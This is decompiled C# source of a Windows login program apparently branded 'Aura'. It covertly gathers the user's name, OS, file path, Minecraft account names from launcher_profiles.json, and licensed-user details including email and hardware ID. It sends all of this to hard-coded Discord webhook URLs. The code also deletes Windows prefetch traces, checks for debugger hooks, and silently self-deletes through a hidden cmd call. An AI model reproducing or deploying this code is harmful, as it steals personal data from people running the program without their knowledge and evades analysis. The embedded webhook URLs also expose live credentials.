using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace uhssvc
{
	// Token: 0x0200002B RID: 43
	internal static class Program
	{
		// Token: 0x0600019B RID: 411
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string string_0);

		// Token: 0x0600019C RID: 412
		[DllImport("kernel32.dll")]
		public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

		// Token: 0x0600019D RID: 413 RVA: 0x00016EAC File Offset: 0x000150AC
		[STAThread]
		private static void Main()
		{
			WebClient webClient = new WebClient();
			DateTime now = DateTime.Now;
			string executablePath = Application.ExecutablePath;
			OnProgramStart.Initialize("Aura LLC", "365854", "HYuHiuh0vMnAwJbwE0QtuZ5RhigYdjgxln0", "1.0");
			webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
			webClient.Proxy = null;
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
			try
			{
				FileInfo[] files = new DirectoryInfo("C:\\Windows\\Prefetch").GetFiles("CONSENT.EXE-*");
				for (int i = 0; i < files.Length; i++)
				{
					File.Delete(files[i].FullName);
				}
				IntPtr intptr_ = Program.LoadLibrary("kernel32.dll");
				IntPtr procAddress = Program.GetProcAddress(intptr_, "IsDebuggerPresent");
				byte[] array = new byte[1];
				Marshal.Copy(procAddress, array, 0, 1);
				if (array[0] == 233)
				{
					Login.AutoClosingMessageBox.Show("Debugger Hook Detected. Please unload it from your memory and restart the program.", "Error", 4000);
					Program.Hacking();
					Program.selfDelete();
					Environment.Exit(0);
				}
				else
				{
					IntPtr procAddress2 = Program.GetProcAddress(intptr_, "CheckRemoteDebuggerPresent");
					array = new byte[1];
					Marshal.Copy(procAddress2, array, 0, 1);
					if (array[0] == 233)
					{
						Login.AutoClosingMessageBox.Show("Debugger Hook Detected. Please unload it from your memory and restart the program.", "Error", 4000);
						Program.Hacking();
						Program.selfDelete();
						Environment.Exit(0);
					}
					else
					{
						Mutex mutex = new Mutex(false, "9w1r14d1vn1");
						try
						{
							if (mutex.WaitOne(0, false))
							{
								Application.EnableVisualStyles();
								Application.SetCompatibleTextRenderingDefault(false);
								Application.Run(new Login());
							}
							else
							{
								string processName = Process.GetCurrentProcess().ProcessName;
								MessageBox.Show("Another  instance is already running. \nClick OK to close the application.", processName + ".exe - Application Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
								Program.Hacking();
								Program.selfDelete();
								Environment.Exit(5);
							}
						}
						catch
						{
						}
					}
				}
			}
			catch (Exception ex)
			{
				string str = "Unhandled Exception.";
				Exception ex2 = ex;
				MessageBox.Show(str + ((ex2 != null) ? ex2.ToString() : null), "Error");
			}
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run(new Login());
		}

		// Token: 0x0600019E RID: 414 RVA: 0x000170DC File Offset: 0x000152DC
		public static void DiscordSendMessage(string string_0, string string_1, string string_2)
		{
			WebClient webClient = new WebClient();
			try
			{
				webClient.UploadValues(string_0, new NameValueCollection
				{
					{
						"content",
						string_2
					},
					{
						"username",
						string_1
					}
				});
			}
			catch (WebException ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x0600019F RID: 415 RVA: 0x00017134 File Offset: 0x00015334
		public static void Hacking()
		{
			string string_ = "https://discord.com/api/webhooks/882535268773691433/AkPN_uaecDzsBGjuy_Cg8BnufRJfIaCi1eI6_2Q2TRb82VyeCgEs7jJEkIm_fmLhDpsX";
			string string_2 = "Aura Logger";
			string[] array = new string[11];
			array[0] = "```\n Username: ";
			array[1] = Environment.UserName;
			array[2] = "\nPath: ";
			array[3] = Program.path;
			array[4] = "\n OS: ";
			int num = 5;
			OperatingSystem osversion = Environment.OSVersion;
			array[num] = ((osversion != null) ? osversion.ToString() : null);
			array[6] = "\n Alts: ";
			array[7] = Program.getAlts();
			array[8] = "\n Bytes: ";
			array[9] = Program.bytes();
			array[10] = "\n Status: Trying to CRACK The Program!\n```";
			string string_3 = string.Concat(array);
			Program.DiscordSendMessage(string_, string_2, string_3);
		}

		// Token: 0x060001A0 RID: 416 RVA: 0x000171C8 File Offset: 0x000153C8
		public static void NewLaunch()
		{
			string string_ = "https://discord.com/api/webhooks/882535268773691433/AkPN_uaecDzsBGjuy_Cg8BnufRJfIaCi1eI6_2Q2TRb82VyeCgEs7jJEkIm_fmLhDpsX";
			string string_2 = "Aura Users";
			string[] array = new string[11];
			array[0] = "```\n Username: ";
			array[1] = Environment.UserName;
			array[2] = "\nPath: ";
			array[3] = Program.path;
			array[4] = "\n OS: ";
			int num = 5;
			OperatingSystem osversion = Environment.OSVersion;
			array[num] = ((osversion != null) ? osversion.ToString() : null);
			array[6] = "\n Alts: ";
			array[7] = Program.getAlts();
			array[8] = "\n Bytes: ";
			array[9] = Program.bytes();
			array[10] = "\n Status: Launched the Program!\n```";
			string string_3 = string.Concat(array);
			Program.DiscordSendMessage(string_, string_2, string_3);
		}

		// Token: 0x060001A1 RID: 417 RVA: 0x0001725C File Offset: 0x0001545C
		public static void HackingUsers()
		{
			string string_ = "https://discord.com/api/webhooks/882535268773691433/AkPN_uaecDzsBGjuy_Cg8BnufRJfIaCi1eI6_2Q2TRb82VyeCgEs7jJEkIm_fmLhDpsX";
			string string_2 = "Aura Logger";
			string[] array = new string[25];
			array[0] = "```\n Username: ";
			array[1] = User.Username;
			array[2] = "\n ID: ";
			array[3] = User.ID.ToString();
			array[4] = "\n Expiry: ";
			array[5] = User.Expiry;
			array[6] = "\n Last Login: ";
			array[7] = User.LastLogin;
			array[8] = "\n User Variable: ";
			array[9] = User.UserVariable;
			array[10] = "\n Hwid: ";
			array[11] = User.HWID;
			array[12] = "\n Register Date: ";
			array[13] = User.RegisterDate;
			array[14] = "\n Email: ";
			array[15] = User.Email;
			array[16] = "\nPath: ";
			array[17] = Program.path;
			array[18] = "\n OS: ";
			int num = 19;
			OperatingSystem osversion = Environment.OSVersion;
			array[num] = ((osversion != null) ? osversion.ToString() : null);
			array[20] = "\n Alts: ";
			array[21] = Program.getAlts();
			array[22] = "\n Bytes: ";
			array[23] = Program.bytes();
			array[24] = "\n Status: Trying to CRACK The Program!\n```";
			string string_3 = string.Concat(array);
			Program.DiscordSendMessage(string_, string_2, string_3);
		}

		// Token: 0x060001A2 RID: 418 RVA: 0x00017374 File Offset: 0x00015574
		public static void NotifyMe()
		{
			string string_ = "https://discord.com/api/webhooks/882353728068407357/ua2ob2t2tl_RDTAsfpFkaTYGD-1P0uSyMrLncKU9Ju7Rb9K5eSRyFavtJHVW4JhVYabC";
			string string_2 = "Aura Privacy Locker";
			string[] array = new string[25];
			array[0] = "```\n Username: ";
			array[1] = User.Username;
			array[2] = "\n ID: ";
			array[3] = User.ID.ToString();
			array[4] = "\n Expiry: ";
			array[5] = User.Expiry;
			array[6] = "\n Last Login: ";
			array[7] = User.LastLogin;
			array[8] = "\n User Variable: ";
			array[9] = User.UserVariable;
			array[10] = "\n Hwid: ";
			array[11] = User.HWID;
			array[12] = "\n Register Date: ";
			array[13] = User.RegisterDate;
			array[14] = "\n Email: ";
			array[15] = User.Email;
			array[16] = "\n OS: ";
			int num = 17;
			OperatingSystem osversion = Environment.OSVersion;
			array[num] = ((osversion != null) ? osversion.ToString() : null);
			array[18] = "\nPath: ";
			array[19] = Program.path;
			array[20] = "\n Alts: ";
			array[21] = Program.getAlts();
			array[22] = "\n Bytes: ";
			array[23] = Program.bytes();
			array[24] = "\n Status: Authorized\n```";
			string string_3 = string.Concat(array);
			Program.DiscordSendMessage(string_, string_2, string_3);
		}

		// Token: 0x060001A3 RID: 419 RVA: 0x0001748C File Offset: 0x0001568C
		public static void selfDelete()
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T & Del \"" + Program.path + "\" & exit",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe",
				Verb = "runas"
			});
			Environment.Exit(0);
		}

		// Token: 0x060001A4 RID: 420 RVA: 0x000174E8 File Offset: 0x000156E8
		public static string bytes()
		{
			FileInfo fileInfo = new FileInfo(Assembly.GetEntryAssembly().Location);
			return string.Format("{0:n0} bytes", fileInfo.Length);
		}

		// Token: 0x060001A5 RID: 421 RVA: 0x0001751C File Offset: 0x0001571C
		public static string getAlts()
		{
			Program.alts = "";
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//.minecraft//launcher_profiles.json", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//.minecraft//launcher_profiles2.json");
				Thread.Sleep(500);
				foreach (string input in from string_0 in File.ReadAllLines(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//.minecraft//launcher_profiles2.json")
				where string_0.Contains("displayName")
				select string_0)
				{
					string str = Regex.Replace(Regex.Replace(input, "displayName", ""), "[^A-Za-z0-9\\-/]", "");
					Program.alts = Program.alts + str + ", ";
				}
				Program.alts = Program.alts.Substring(0, Program.alts.Length - 2);
				if (Program.alts.Contains("latest-") || Program.alts.Contains("authenticationDatabase"))
				{
					Program.alts = "failed.";
				}
			}
			catch
			{
				Program.alts = "failed.";
			}
			try
			{
				File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//.minecraft//launcher_profiles2.json");
			}
			catch
			{
			}
			return Program.alts;
		}

		// Token: 0x04000384 RID: 900
		public static string path = Assembly.GetExecutingAssembly().Location;

		// Token: 0x04000385 RID: 901
		private static string alts = "";
	}
}
